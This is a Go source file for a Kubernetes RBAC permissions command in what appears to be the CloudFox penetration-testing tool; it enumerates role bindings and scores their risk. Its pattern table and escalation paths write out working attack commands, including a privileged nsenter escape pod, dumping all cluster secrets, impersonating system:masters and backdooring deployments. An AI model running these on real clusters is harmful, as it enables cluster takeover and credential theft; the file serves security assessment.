package commands

import (
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	v1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

var PermissionsCmd = &cobra.Command{
	Use:     "permissions",
	Aliases: []string{"perms"},
	Short:   "List all cluster RBAC permissions with comprehensive security analysis",
	Long: `
List all cluster RBAC permissions with detailed security analysis including:
- Privilege escalation path detection (15+ patterns)
- Dangerous permission pattern identification
- Service account security analysis
- RBAC misconfiguration detection
- Complete attack path visualization

Usage:
  cloudfox kubernetes permissions`,
	Run: RunEnumPermissions,
}

type PermsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PermsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t PermsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

// PermissionFinding represents comprehensive security analysis for a permission
type PermissionFinding struct {
	// Basic info
	ResourceType     string // RoleBinding, ClusterRoleBinding
	Namespace        string
	SubjectKind      string // User, Group, ServiceAccount
	SubjectName      string
	SubjectNamespace string
	Role             string
	ClusterRole      string

	// Permission details
	Verb          string
	Resource      string
	ResourceNames []string // Specific resource name restrictions
	APIGroup      string
	Scope         string // cluster, namespace

	// Security analysis
	RiskLevel             string // CRITICAL/HIGH/MEDIUM/LOW
	SecurityIssues        []string
	DangerousPermissions  []string
	MisconfigurationTypes []string

	// Privilege escalation detection
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string
	EscalationRisk            string // CRITICAL/HIGH/MEDIUM/LOW/NONE

	// Dangerous permission categories
	AllowsClusterAdmin       bool
	AllowsCreatePods         bool
	AllowsExecPods           bool
	AllowsCreateSecrets      bool
	AllowsReadSecrets        bool
	AllowsCreateRoleBindings bool
	AllowsImpersonate        bool
	AllowsWildcardResources  bool
	AllowsWildcardVerbs      bool

	// Container escape risks
	AllowsHostPath       bool
	AllowsPrivilegedPods bool
	AllowsHostNetwork    bool
	AllowsNodeAccess     bool
	ContainerEscapeRisk  string

	// Resource scope analysis
	HasResourceNameRestriction bool
	IsWildcardRole             bool

	// Service account specific
	IsServiceAccount      bool
	AutomountServiceToken bool
	BoundToWorkloads      bool
	WorkloadCount         int

	// Attack scenarios
	AllowsClusterTakeover  bool
	AllowsDataExfiltration bool
	AllowsLateralMovement  bool
	AttackPaths            []string
}

// EscalationPath represents a privilege escalation chain
type EscalationPath struct {
	Subject         string
	StartPermission string
	Steps           []string
	EndResult       string
	RiskLevel       string
}

// PermissionPattern represents a dangerous permission pattern
type PermissionPattern struct {
	Name            string
	Description     string
	Severity        string
	ExploitGuidance string
	Check           func(p PermissionFinding) bool
}


// Dangerous permission patterns database
var dangerousPermissionPatterns = []PermissionPattern{
	{
		Name:            "Cluster Admin",
		Description:     "Full cluster administrative access",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "This role grants unrestricted access to all cluster resources. Can read all secrets, create/delete any resource, and fully compromise the cluster.",
		Check: func(p PermissionFinding) bool {
			return p.ClusterRole == "cluster-admin" || p.Role == "cluster-admin"
		},
	},
	{
		Name:            "Wildcard Resources",
		Description:     "Access to all resource types (*)",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "Can perform actions on ANY resource type in the cluster. Equivalent to cluster-admin when combined with wildcard verbs.",
		Check: func(p PermissionFinding) bool {
			return p.Resource == "*"
		},
	},
	{
		Name:            "Wildcard Verbs",
		Description:     "All verbs allowed (*)",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "Can perform ANY action (get, list, create, update, delete, etc.) on resources. Extremely dangerous when combined with broad resource access.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "*"
		},
	},
	{
		Name:            "Create Pods",
		Description:     "Can create pods without restrictions",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "Create privileged pod with hostPath:/ → container escape → node root → etcd access → cluster takeover",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "pods" && len(p.ResourceNames) == 0
		},
	},
	{
		Name:            "Create ClusterRoleBindings",
		Description:     "Can grant cluster-wide permissions",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --user=<self> → instant cluster-admin",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "clusterrolebindings"
		},
	},
	{
		Name:            "Create RoleBindings",
		Description:     "Can grant namespace permissions",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl create rolebinding escalate --clusterrole=admin --serviceaccount=<namespace>:<self> -n <namespace>",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "rolebindings"
		},
	},
	{
		Name:            "Escalate Verb",
		Description:     "Can bypass RBAC restrictions when creating roles",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "Special verb allowing creation of roles/rolebindings with permissions the user doesn't have. Bypasses normal RBAC escalation prevention.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "escalate"
		},
	},
	{
		Name:            "Bind Verb",
		Description:     "Can bind roles without having their permissions",
		Severity:        shared.RiskCritical,
		ExploitGuidance: "Can create RoleBindings to powerful roles (like cluster-admin) without owning those permissions first. Direct path to privilege escalation.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "bind"
		},
	},
	{
		Name:            "Impersonate Users",
		Description:     "Can act as other users or service accounts",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl get secrets -A --as=admin --as-group=system:masters → steal credentials → lateral movement",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "impersonate"
		},
	},
	{
		Name:            "Get/List Secrets (Cluster)",
		Description:     "Can read all secrets cluster-wide",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)' → database passwords, API keys, tokens",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "get" || p.Verb == "list") && p.Resource == "secrets" && p.Scope == "cluster"
		},
	},
	{
		Name:            "Get/List Secrets (Namespace)",
		Description:     "Can read secrets in namespace",
		Severity:        shared.RiskMedium,
		ExploitGuidance: "kubectl get secrets -n <namespace> -o json | jq '.items[].data | map_values(@base64d)'",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "get" || p.Verb == "list") && p.Resource == "secrets" && p.Scope == "namespace"
		},
	},
	{
		Name:            "Exec Into Pods",
		Description:     "Can execute commands in running containers",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl exec -it <pod> -n <namespace> -- /bin/sh → RCE in container → steal mounted secrets → lateral movement",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "pods/exec"
		},
	},
	{
		Name:            "Delete Namespaces",
		Description:     "Can destroy entire namespaces",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl delete namespace <target> → destroys all resources, persistent volumes, and data in namespace",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "delete" && p.Resource == "namespaces"
		},
	},
	{
		Name:            "Create Nodes",
		Description:     "Can add malicious nodes to cluster",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "Register rogue node → drain legitimate workloads to malicious node → steal secrets and data",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "nodes"
		},
	},
	{
		Name:            "Patch/Update Deployments",
		Description:     "Can modify deployments for backdoor injection",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "kubectl patch deployment <target> --patch '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"backdoor\",\"image\":\"malicious\"}]}}}}' → persistent backdoor",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "patch" || p.Verb == "update") && p.Resource == "deployments"
		},
	},
	{
		Name:            "Patch/Update DaemonSets",
		Description:     "Can modify DaemonSets for node-wide persistence",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "Inject malicious container into DaemonSet → runs on every node in cluster → cluster-wide persistence",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "patch" || p.Verb == "update") && p.Resource == "daemonsets"
		},
	},
	{
		Name:            "Create PersistentVolumes",
		Description:     "Can create hostPath PVs for host filesystem access",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "Create hostPath PV pointing to / → create PVC → mount in pod → read /etc/shadow, SSH keys, kubeconfig",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "persistentvolumes"
		},
	},
	{
		Name:            "Proxy to Services",
		Description:     "Can proxy to cluster services",
		Severity:        shared.RiskMedium,
		ExploitGuidance: "kubectl proxy → access internal services from external network → bypass NetworkPolicies",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "services/proxy"
		},
	},
	{
		Name:            "Update ConfigMaps",
		Description:     "Can modify application configurations",
		Severity:        shared.RiskMedium,
		ExploitGuidance: "Modify ConfigMap → inject malicious config (e.g., redirect logs, change endpoints) → wait for pod restart",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "update" || p.Verb == "patch") && p.Resource == "configmaps"
		},
	},
	{
		Name:            "Create PodSecurityPolicies",
		Description:     "Can create permissive PSPs",
		Severity:        shared.RiskHigh,
		ExploitGuidance: "Create PSP allowing privileged pods, hostPath, hostNetwork → use to bypass pod security restrictions",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "podsecuritypolicies"
		},
	},
}

func RunEnumPermissions(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()
	parentCmd := cmd.Parent()

	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating RBAC permissions for %s with comprehensive security analysis", globals.ClusterName), globals.K8S_PERMISSIONS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Fetch all required resources
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_PERMISSIONS_MODULE_NAME)

	clusterRoles, err := clientset.RbacV1().ClusterRoles().List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "cluster roles", "", err, globals.K8S_PERMISSIONS_MODULE_NAME, true)
		return
	}

	clusterRoleBindings, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "cluster role bindings", "", err, globals.K8S_PERMISSIONS_MODULE_NAME, true)
		return
	}

	// Build permission findings with security analysis
	var findings []PermissionFinding

	// Process ClusterRoleBindings
	for _, crb := range clusterRoleBindings.Items {
		if len(crb.Subjects) == 0 {
			continue
		}

		// Find the referenced ClusterRole
		var clusterRole *v1.ClusterRole
		for i := range clusterRoles.Items {
			if clusterRoles.Items[i].Name == crb.RoleRef.Name {
				clusterRole = &clusterRoles.Items[i]
				break
			}
		}

		if clusterRole == nil {
			continue
		}

		// Process each rule in the ClusterRole
		for _, rule := range clusterRole.Rules {
			perms := explodeRule(rule)
			for _, perm := range perms {
				for _, subj := range crb.Subjects {
					subjNamespace := subj.Namespace
					if subjNamespace == "" {
						subjNamespace = "<cluster>"
					}

					finding := PermissionFinding{
						ResourceType:     "ClusterRoleBinding",
						Namespace:        subjNamespace,
						SubjectKind:      subj.Kind,
						SubjectName:      subj.Name,
						SubjectNamespace: subj.Namespace,
						ClusterRole:      crb.RoleRef.Name,
						Verb:             perm.Verb,
						Resource:         perm.Resource,
						ResourceNames:    rule.ResourceNames,
						APIGroup:         perm.APIGroup,
						Scope:            "cluster",
					}

					// Perform security analysis
					analyzePermissionSecurity(&finding)

					findings = append(findings, finding)
				}
			}
		}
	}

	// Process Roles and RoleBindings namespace by namespace
	for _, ns := range namespaces {
		roles, err := clientset.RbacV1().Roles(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			shared.LogListError(&logger, "roles", ns, err, globals.K8S_PERMISSIONS_MODULE_NAME, false)
			continue
		}

		rbs, err := clientset.RbacV1().RoleBindings(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			shared.LogListError(&logger, "role bindings", ns, err, globals.K8S_PERMISSIONS_MODULE_NAME, false)
			continue
		}

		for _, rb := range rbs.Items {
			if len(rb.Subjects) == 0 {
				continue
			}

			// Find the referenced Role
			var role *v1.Role
			for i := range roles.Items {
				if roles.Items[i].Name == rb.RoleRef.Name {
					role = &roles.Items[i]
					break
				}
			}

			if role == nil {
				continue
			}

			// Process each rule in the Role
			for _, rule := range role.Rules {
				perms := explodeRule(rule)
				for _, perm := range perms {
					for _, subj := range rb.Subjects {
						subjNamespace := subj.Namespace
						if subjNamespace == "" {
							subjNamespace = "<NONE>"
						}

						finding := PermissionFinding{
							ResourceType:     "RoleBinding",
							Namespace:        ns,
							SubjectKind:      subj.Kind,
							SubjectName:      subj.Name,
							SubjectNamespace: subjNamespace,
							Role:             rb.RoleRef.Name,
							Verb:             perm.Verb,
							Resource:         perm.Resource,
							ResourceNames:    rule.ResourceNames,
							APIGroup:         perm.APIGroup,
							Scope:            "namespace",
						}

						// Perform security analysis
						analyzePermissionSecurity(&finding)

						findings = append(findings, finding)
					}
				}
			}
		}
	}

	// Detect privilege escalation paths (used for summary statistics)
	escalationPaths := detectPrivilegeEscalationPaths(findings)

	// Generate outputs
	tableFile := generatePermissionsTable(findings)
	lootFiles := generatePermissionsLootFiles(findings)

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Permissions",
		globals.ClusterName,
		"results",
		PermsOutput{
			Table: []internal.TableFile{tableFile},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PERMISSIONS_MODULE_NAME)
		return
	}

	// Summary statistics
	criticalCount := 0
	highCount := 0
	escalationCount := len(escalationPaths)
	for _, f := range findings {
		if f.RiskLevel == shared.RiskCritical {
			criticalCount++
		} else if f.RiskLevel == shared.RiskHigh {
			highCount++
		}
	}

	if len(findings) > 0 {
		logger.InfoM(fmt.Sprintf("%d permissions found (%d CRITICAL, %d HIGH risk, %d escalation paths)", len(findings), criticalCount, highCount, escalationCount), globals.K8S_PERMISSIONS_MODULE_NAME)
	} else {
		logger.InfoM("No permissions found, skipping output file creation", globals.K8S_PERMISSIONS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PERMISSIONS_MODULE_NAME), globals.K8S_PERMISSIONS_MODULE_NAME)
}

// analyzePermissionSecurity performs comprehensive security analysis on a permission
func analyzePermissionSecurity(finding *PermissionFinding) {
	// Check if service account
	finding.IsServiceAccount = (finding.SubjectKind == "ServiceAccount")

	// Check for resource name restrictions
	finding.HasResourceNameRestriction = len(finding.ResourceNames) > 0

	// Detect dangerous permission categories
	if finding.Resource == "*" {
		finding.AllowsWildcardResources = true
	}
	if finding.Verb == "*" {
		finding.AllowsWildcardVerbs = true
	}
	if finding.Verb == "create" && finding.Resource == "pods" {
		finding.AllowsCreatePods = true
	}
	if finding.Verb == "create" && finding.Resource == "pods/exec" {
		finding.AllowsExecPods = true
	}
	if finding.Verb == "create" && finding.Resource == "secrets" {
		finding.AllowsCreateSecrets = true
	}
	if (finding.Verb == "get" || finding.Verb == "list" || finding.Verb == "*") && finding.Resource == "secrets" {
		finding.AllowsReadSecrets = true
	}
	if finding.Verb == "create" && (finding.Resource == "rolebindings" || finding.Resource == "clusterrolebindings") {
		finding.AllowsCreateRoleBindings = true
	}
	if finding.Verb == "impersonate" {
		finding.AllowsImpersonate = true
	}
	if finding.ClusterRole == "cluster-admin" || finding.Role == "cluster-admin" {
		finding.AllowsClusterAdmin = true
	}

	// Container escape risks
	if finding.AllowsCreatePods {
		finding.AllowsHostPath = true
		finding.AllowsPrivilegedPods = true
		finding.AllowsHostNetwork = true
		finding.ContainerEscapeRisk = shared.RiskCritical
	}

	// Attack scenarios
	if finding.AllowsClusterAdmin || (finding.AllowsWildcardResources && finding.AllowsWildcardVerbs) {
		finding.AllowsClusterTakeover = true
	}
	if finding.AllowsReadSecrets {
		finding.AllowsDataExfiltration = true
	}
	if finding.AllowsImpersonate || finding.AllowsExecPods {
		finding.AllowsLateralMovement = true
	}

	// Check against dangerous patterns
	for _, pattern := range dangerousPermissionPatterns {
		if pattern.Check(*finding) {
			finding.DangerousPermissions = append(finding.DangerousPermissions, pattern.Name)
			finding.SecurityIssues = append(finding.SecurityIssues,
				fmt.Sprintf("%s: %s", pattern.Name, pattern.Description))
		}
	}

	// Privilege escalation detection
	if finding.AllowsCreateRoleBindings {
		finding.AllowsPrivilegeEscalation = true
		finding.EscalationRisk = shared.RiskCritical
		finding.EscalationPaths = append(finding.EscalationPaths,
			"Create RoleBinding to cluster-admin → instant privilege escalation")
	}
	if finding.Verb == "escalate" || finding.Verb == "bind" {
		finding.AllowsPrivilegeEscalation = true
		finding.EscalationRisk = shared.RiskCritical
	}
	if finding.AllowsCreatePods {
		finding.AllowsPrivilegeEscalation = true
		if finding.EscalationRisk != shared.RiskCritical {
			finding.EscalationRisk = shared.RiskHigh
		}
		finding.EscalationPaths = append(finding.EscalationPaths,
			"Create privileged pod → container escape → node root → cluster takeover")
	}

	// Calculate overall risk level
	finding.RiskLevel = calculatePermissionRiskLevel(*finding)
}

// calculatePermissionRiskLevel determines overall risk level
func calculatePermissionRiskLevel(finding PermissionFinding) string {
	riskScore := 0

	// CRITICAL FACTORS (50+ points)
	if finding.AllowsClusterAdmin {
		riskScore += 100
	}
	if finding.AllowsCreateRoleBindings && finding.Scope == "cluster" {
		riskScore += 90
	}
	if finding.AllowsWildcardResources && finding.AllowsWildcardVerbs {
		riskScore += 85
	}
	if finding.Verb == "escalate" || finding.Verb == "bind" {
		riskScore += 80
	}
	if finding.AllowsCreatePods && !finding.HasResourceNameRestriction {
		riskScore += 75
	}

	// HIGH FACTORS (25-40 points)
	if finding.AllowsExecPods {
		riskScore += 40
	}
	if finding.AllowsReadSecrets && finding.Scope == "cluster" {
		riskScore += 35
	}
	if finding.AllowsImpersonate {
		riskScore += 30
	}
	if finding.Verb == "delete" && finding.Resource == "namespaces" {
		riskScore += 30
	}
	if finding.Verb == "create" && finding.Resource == "nodes" {
		riskScore += 28
	}
	if (finding.Verb == "patch" || finding.Verb == "update") && finding.Resource == "daemonsets" {
		riskScore += 27
	}
	if finding.Verb == "create" && finding.Resource == "persistentvolumes" {
		riskScore += 26
	}

	// MEDIUM FACTORS (10-20 points)
	if finding.AllowsReadSecrets && finding.Scope == "namespace" {
		riskScore += 20
	}
	if finding.AllowsCreateRoleBindings && finding.Scope == "namespace" {
		riskScore += 18
	}
	if (finding.Verb == "patch" || finding.Verb == "update") && finding.Resource == "deployments" {
		riskScore += 15
	}
	if (finding.Verb == "update" || finding.Verb == "patch") && finding.Resource == "configmaps" {
		riskScore += 12
	}

	// Resource name restriction reduces risk
	if finding.HasResourceNameRestriction {
		riskScore -= 10
	}

	// Classify
	if riskScore >= 50 {
		return shared.RiskCritical
	} else if riskScore >= 25 {
		return shared.RiskHigh
	} else if riskScore >= 10 {
		return shared.RiskMedium
	}
	return shared.RiskLow
}

// detectPrivilegeEscalationPaths identifies privilege escalation chains
func detectPrivilegeEscalationPaths(permissions []PermissionFinding) []EscalationPath {
	var paths []EscalationPath

	// Group permissions by subject
	subjectPerms := make(map[string][]PermissionFinding)
	for _, p := range permissions {
		key := fmt.Sprintf("%s/%s/%s", p.SubjectKind, p.SubjectNamespace, p.SubjectName)
		subjectPerms[key] = append(subjectPerms[key], p)
	}

	for subject, perms := range subjectPerms {
		// Path 1: create clusterrolebindings = instant cluster-admin
		if hasPermission(perms, "create", "clusterrolebindings") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create clusterrolebindings",
				Steps: []string{
					"kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --user=<self>",
					"Gain full cluster-admin privileges",
					"Access all secrets, pods, nodes",
					"Complete cluster takeover",
				},
				EndResult: "Cluster-admin privileges",
				RiskLevel: shared.RiskCritical,
			})
		}

		// Path 2: create pods = container escape
		if hasPermission(perms, "create", "pods") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create pods",
				Steps: []string{
					"Create privileged pod with hostPath: /",
					"kubectl run escape --image=alpine --restart=Never --overrides='{\"spec\":{\"hostNetwork\":true,\"hostPID\":true,\"containers\":[{\"name\":\"escape\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"-t\",\"1\",\"-m\",\"-u\",\"-n\",\"-i\",\"sh\"],\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'",
					"Exec into pod: kubectl exec -it escape -- sh",
					"Access host filesystem at /host",
					"Read /host/etc/shadow, /host/root/.kube/config",
					"Access etcd secrets: cat /host/var/lib/etcd/*",
					"Become cluster-admin",
				},
				EndResult: "Full cluster compromise via container escape",
				RiskLevel: shared.RiskCritical,
			})
		}

		// Path 3: get secrets + create pods = credential theft
		if hasPermission(perms, "get", "secrets") && hasPermission(perms, "create", "pods") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "get secrets + create pods",
				Steps: []string{
					"kubectl get secrets -A -o json > all-secrets.json",
					"Extract database credentials, API keys, service account tokens",
					"Create pod with stolen credentials",
					"Use credentials for lateral movement",
					"Escalate via compromised high-privilege service accounts",
				},
				EndResult: "Data exfiltration and lateral movement",
				RiskLevel: shared.RiskHigh,
			})
		}

		// Path 4: impersonate + exec = lateral movement
		if hasPermission(perms, "impersonate", "users") && hasPermission(perms, "create", "pods/exec") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "impersonate users + exec pods",
				Steps: []string{
					"kubectl get pods -A --as=admin",
					"kubectl exec -it <privileged-pod> --as=admin -- sh",
					"Steal service account token from pod",
					"Use token to escalate privileges",
				},
				EndResult: "Lateral movement via impersonation",
				RiskLevel: shared.RiskHigh,
			})
		}

		// Path 5: patch deployments = persistent backdoor
		if hasPermission(perms, "patch", "deployments") || hasPermission(perms, "update", "deployments") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "patch/update deployments",
				Steps: []string{
					"Identify target deployment with elevated privileges",
					"kubectl patch deployment <target> --patch '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"backdoor\",\"image\":\"attacker/backdoor\",\"securityContext\":{\"privileged\":true}}]}}}}'",
					"Wait for deployment rollout",
					"Exec into backdoor container",
					"Container escape to node",
					"Persistent access via deployment",
				},
				EndResult: "Persistent backdoor via deployment modification",
				RiskLevel: shared.RiskHigh,
			})
		}

		// Path 6: create persistentvolumes = host filesystem access
		if hasPermission(perms, "create", "persistentvolumes") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create persistentvolumes",
				Steps: []string{
					"Create PV with hostPath pointing to /",
					"Create PVC binding to the PV",
					"Create pod mounting the PVC",
					"Access entire host filesystem",
					"Read /etc/shadow, SSH keys, kubeconfig",
					"Exfiltrate sensitive data",
				},
				EndResult: "Host filesystem access and data exfiltration",
				RiskLevel: shared.RiskHigh,
			})
		}

		// Path 7: escalate/bind verbs = RBAC bypass
		if hasPermission(perms, "escalate", "") || hasPermission(perms, "bind", "") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "escalate or bind verb",
				Steps: []string{
					"Create RoleBinding to cluster-admin without restrictions",
					"Bypass normal RBAC escalation prevention",
					"Gain cluster-admin privileges",
				},
				EndResult: "RBAC restriction bypass → cluster-admin",
				RiskLevel: shared.RiskCritical,
			})
		}

		// Path 8: patch daemonsets = node-wide persistence
		if hasPermission(perms, "patch", "daemonsets") || hasPermission(perms, "update", "daemonsets") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "patch/update daemonsets",
				Steps: []string{
					"Identify DaemonSet running on all nodes",
					"Inject malicious container into DaemonSet",
					"Malicious container runs on every node",
					"Cluster-wide persistence and control",
				},
				EndResult: "Cluster-wide persistence via DaemonSet",
				RiskLevel: shared.RiskHigh,
			})
		}
	}

	return paths
}


// generateTable creates the table output
func generatePermissionsTable(findings []PermissionFinding) internal.TableFile {
	headers := []string{
		"Subject",
		"Namespace",
		"Role/ClusterRole",
		"Verb",
		"Resource",
		"Resource Names",
		"API Group",
		"Scope",
		"SA AutoMount",
		"Workloads",
	}

	var rows [][]string

	// Deduplicate findings by key fields
	seen := make(map[string]bool)
	var uniqueFindings []PermissionFinding

	for _, f := range findings {
		key := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s",
			f.SubjectKind, f.SubjectName, f.SubjectNamespace, f.Verb, f.Resource, f.APIGroup, f.Role, f.ClusterRole)
		if !seen[key] {
			seen[key] = true
			uniqueFindings = append(uniqueFindings, f)
		}
	}

	for _, f := range uniqueFindings {
		subject := fmt.Sprintf("%s/%s", f.SubjectKind, f.SubjectName)
		roleInfo := k8sinternal.NonEmpty(f.ClusterRole)
		if roleInfo == "" {
			roleInfo = k8sinternal.NonEmpty(f.Role)
		}

		resourceNames := "<ALL>"
		if len(f.ResourceNames) > 0 {
			resourceNames = strings.Join(f.ResourceNames, ", ")
		}

		saAutoMount := "N/A"
		if f.IsServiceAccount {
			if f.AutomountServiceToken {
				saAutoMount = "Yes"
			} else {
				saAutoMount = "No"
			}
		}

		workloads := "N/A"
		if f.IsServiceAccount {
			if f.WorkloadCount > 0 {
				workloads = fmt.Sprintf("%d pods", f.WorkloadCount)
			} else {
				workloads = "Unused"
			}
		}

		row := []string{
			subject,
			f.Namespace,
			roleInfo,
			f.Verb,
			f.Resource,
			resourceNames,
			k8sinternal.NonEmpty(f.APIGroup),
			f.Scope,
			saAutoMount,
			workloads,
		}
		rows = append(rows, row)
	}

	// Sort by subject
	sort.SliceStable(rows, func(i, j int) bool {
		return rows[i][0] < rows[j][0]
	})

	return internal.TableFile{
		Name:   "Permissions",
		Header: headers,
		Body:   rows,
	}
}

// generateLootFiles creates all loot files
// Note: Attack-specific loot files (privilege escalation, secret access, impersonation, etc.)
// have been moved to dedicated modules: privesc, data-exfiltration, lateral-movement
func generatePermissionsLootFiles(findings []PermissionFinding) []internal.LootFile {
	var lootFiles []internal.LootFile

	// 1. Permissions-Enum.txt - Basic RBAC enumeration commands
	lootFiles = append(lootFiles, generateEnumLoot(findings))

	// 2. Permissions-ExamplePodYAML.txt - Example pods for testing service accounts
	lootFiles = append(lootFiles, generatePermissionsPodYAMLsLoot(findings))

	return lootFiles
}

func generateEnumLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         RBAC PERMISSIONS ENUMERATION")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	if globals.KubeContext != "" {
		content = append(content, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	content = append(content, "# List all ClusterRoles")
	content = append(content, "kubectl get clusterroles")
	content = append(content, "")

	content = append(content, "# List all ClusterRoleBindings")
	content = append(content, "kubectl get clusterrolebindings")
	content = append(content, "")

	content = append(content, "# List Roles and RoleBindings in all namespaces")
	content = append(content, "kubectl get roles,rolebindings -A")
	content = append(content, "")

	content = append(content, "# Check your current permissions")
	content = append(content, "kubectl auth can-i --list")
	content = append(content, "")

	content = append(content, "# Check specific permission")
	content = append(content, "kubectl auth can-i create pods")
	content = append(content, "kubectl auth can-i get secrets -A")
	content = append(content, "kubectl auth can-i create clusterrolebindings")
	content = append(content, "")

	return internal.LootFile{
		Name:     "Permissions-Enum",
		Contents: strings.Join(content, "\n"),
	}
}


func generatePermissionsPodYAMLsLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         EXAMPLE POD YAMLs FOR SERVICE ACCOUNTS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	// Track unique service accounts
	seenSA := make(map[string]bool)

	for _, f := range findings {
		if f.IsServiceAccount {
			key := fmt.Sprintf("%s/%s", f.Namespace, f.SubjectName)
			if seenSA[key] {
				continue
			}
			seenSA[key] = true

			ns := f.Namespace
			if ns == "<cluster>" {
				ns = "default"
			}

			podName := fmt.Sprintf("test-%s", strings.ReplaceAll(f.SubjectName, ":", "-"))
			pod := corev1.Pod{
				TypeMeta: metav1.TypeMeta{
					APIVersion: "v1",
					Kind:       "Pod",
				},
				ObjectMeta: metav1.ObjectMeta{
					Name:      podName,
					Namespace: ns,
				},
				Spec: corev1.PodSpec{
					ServiceAccountName: f.SubjectName,
					Containers: []corev1.Container{
						{
							Name:    "alpine",
							Image:   "alpine:latest",
							Command: []string{"sh", "-c", "sleep 3600"},
						},
					},
				},
			}

			yamlData, err := yaml.Marshal(pod)
			if err == nil {
				content = append(content, fmt.Sprintf("# ServiceAccount: %s (namespace: %s)", f.SubjectName, ns))
				content = append(content, string(yamlData))
				content = append(content, "---")
				content = append(content, "")
			}
		}
	}

	return internal.LootFile{
		Name:     "Permissions-ExamplePodYAML",
		Contents: strings.Join(content, "\n"),
	}
}


// Helper functions

type explodedPerm struct {
	Verb     string
	Resource string
	APIGroup string
}

func explodeRule(rule v1.PolicyRule) []explodedPerm {
